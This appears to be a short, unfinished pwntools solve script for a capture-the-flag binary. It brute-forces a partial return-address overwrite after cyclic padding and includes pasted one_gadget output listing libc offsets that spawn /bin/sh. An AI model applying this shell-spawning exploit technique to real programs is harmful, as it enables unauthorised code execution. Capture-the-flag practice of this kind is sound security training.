from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

while True:
    try:
        # io=remote("pwn-8ffe2063b6.challenge.xctf.org.cn", 9999, ssl=True)
        io=process("./ezzzz")
        libc=ELF("./libc.so.6")
        # gdb.attach(io)
        # pause()
        io.send(cyclic(0x18)+b"\xf5\xcc\xaf") 
        sleep(0.3)
        
    
    except:
        io.close()
        continue                


# 0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebcf5 execve("/bin/sh", r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebcf8 execve("/bin/sh", rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebd52 execve("/bin/sh", rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [r12] == NULL || r12 == NULL

# 0xebdaf execve("/bin/sh", rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebdb3 execve("/bin/sh", rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x50 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
